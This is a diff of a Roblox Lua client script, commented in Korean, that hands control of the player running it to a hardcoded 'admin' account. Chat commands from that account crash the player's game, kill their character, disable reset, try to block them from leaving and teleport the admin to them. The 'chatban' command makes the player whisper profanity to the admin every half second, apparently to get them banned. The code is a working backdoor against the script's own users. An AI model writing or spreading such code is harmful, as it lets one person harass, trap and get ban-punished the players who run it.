@@ -1,8 +1,11 @@
-local TextChatService = game:GetService("TextChatService")
+-- A
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local AdminList = { "Diwno2ff" }
+local TextChatService = game:GetService("TextChatService")
 
+local AdminList = { "Diwno2ff" } -- 어드민 이름들
+
+local Loops = {}
 local cmds = {}
 
 -- crash
@@ -13,7 +16,7 @@ cmds["crash"] = function()
 end
 
 -- kick (재설정 금지 + 나가기 금지)
-cmds["kick"] = function(_, _)
+cmds["kick"] = function()
     if LocalPlayer.Character then
         local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
         local Hocf = hrp and hrp.CFrame
@@ -34,7 +37,7 @@ cmds["kick"] = function(_, _)
             newHum.Health = math.huge
         end)
 
-        -- 재설정 금지
+        -- Reset 비활성화
         task.spawn(function()
             repeat
                 task.wait()
@@ -44,34 +47,26 @@ cmds["kick"] = function(_, _)
             until false
         end)
 
-        -- 나가기 금지
-        task.spawn(function()
-            while true do
-                pcall(function()
-                    game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(obj)
-                        if obj.Name == "ErrorPrompt" then
-                            obj:Destroy()
-                        end
-                    end)
-                end)
-                task.wait(1)
+        -- 나가기 방지 (Teleport 방해)
+        LocalPlayer.OnTeleport = function(State)
+            if State == Enum.TeleportState.Started then
+                error("Leaving blocked!")
             end
-        end)
-    end
-end
-
--- bring (Admin → 나, 한 번만)
-cmds["bring"] = function(Admin)
-    if LocalPlayer.Character and Admin.Character then
-        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
-        if hrp and adminHrp then
-            hrp.CFrame = adminHrp.CFrame
         end
     end
 end
 
--- kill
+-- bring (어드민이 사용자 위치로 순간이동)
+cmds["bring"] = function(Admin)
+    if not (Admin and Admin.Character and LocalPlayer.Character) then return end
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
+    if hrp and adminHrp then
+        adminHrp.CFrame = hrp.CFrame
+    end
+end
+
+-- kill (사용자 죽이기)
 cmds["kill"] = function()
     if LocalPlayer.Character then
         local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
@@ -81,48 +76,31 @@ cmds["kill"] = function()
     end
 end
 
--- chatban (밴 걸릴 때까지 admin에게 비공 메시지 전송)
-cmds["chatban"] = function(sender)
+-- chatban (비공으로 fuck 반복)
+cmds["chatban"] = function(Admin)
+    if not Admin then return end
     task.spawn(function()
         while true do
-            task.wait(0.2)
-            local succ, err = pcall(function()
-                for _, adminName in ipairs(AdminList) do
-                    local admin = Players:FindFirstChild(adminName)
-                    if admin then
-                        local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-                        if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
-                            chatEvent.SayMessageRequest:FireServer("fuck", "To " .. admin.Name)
-                        end
-                    end
-                end
-            end)
-            if not succ then
-                break -- 밴 등으로 채팅 불가 시 종료
+            task.wait(0.5)
+            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if channel then
+                channel:SendAsync(string.format("/w %s fuck", Admin.Name))
             end
         end
     end)
 end
 
--- help (admin 제외한 사용자만 가능)
-cmds["help"] = function(sender)
-    if not isAdminListed(sender.Name) then
-        for _, adminName in ipairs(AdminList) do
-            local admin = Players:FindFirstChild(adminName)
-            if admin then
-                pcall(function()
-                    local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-                    if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
-                        chatEvent.SayMessageRequest:FireServer("나는 NP를 사용해요.", "To " .. admin.Name)
-                    end
-                end)
-            end
-        end
+-- help (비공으로 "나는 NP를 사용해요." 한 번 전송)
+cmds["help"] = function(Admin)
+    if not Admin then return end
+    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if channel then
+        channel:SendAsync(string.format("/w %s 나는 NP를 사용해요.", Admin.Name))
     end
 end
 
--- Admin 확인
-function isAdminListed(playerName)
+-- 어드민 확인
+local function isAdminListed(playerName)
     for _, name in ipairs(AdminList) do
         if name:lower() == playerName:lower() then
             return true
@@ -131,47 +109,23 @@ function isAdminListed(playerName)
     return false
 end
 
--- 플레이어 찾기
-function FindMatch(Name)
-    Name = Name:lower()
-    for _, Player in Players:GetPlayers() do
-        if Player.Name:lower():sub(1, #Name) == Name then
-            return Player
-        end
-    end
-    return nil
-end
-
--- 명령 처리
+-- 채팅 감지
 TextChatService.OnIncomingMessage = function(message)
     local sender = message.TextSource
     if not sender then return end
-
-    local senderName = sender.Name
-    if not isAdminListed(senderName) then return end
+    if not isAdminListed(sender.Name) then return end
 
     local lowerMsg = message.Text:lower()
     if string.sub(lowerMsg, 1, 1) == ":" then
         local args = string.split(string.sub(lowerMsg, 2), " ")
-        if #args == 0 then return end
+        local Command = args[1] and args[1]:lower()
+        local TargetName = args[2] or ""
 
-        local Command = table.remove(args, 1)
-        local TargetName = args[1] or ""
-        local Data = table.concat(args, " ", 2)
-
-        Command = Command:lower()
         if cmds[Command] then
-            local Target
-            if TargetName == "@s" or TargetName:lower() == LocalPlayer.Name:lower() then
-                Target = LocalPlayer
+            if Command == "bring" or Command == "chatban" or Command == "help" then
+                cmds[Command](Players:FindFirstChild(sender.Name))
             else
-                Target = FindMatch(TargetName)
-            end
-
-            if TargetName == "all" or Target == LocalPlayer then
-                pcall(function()
-                    cmds[Command](sender, Data)
-                end)
+                cmds[Command]()
             end
         end
     end
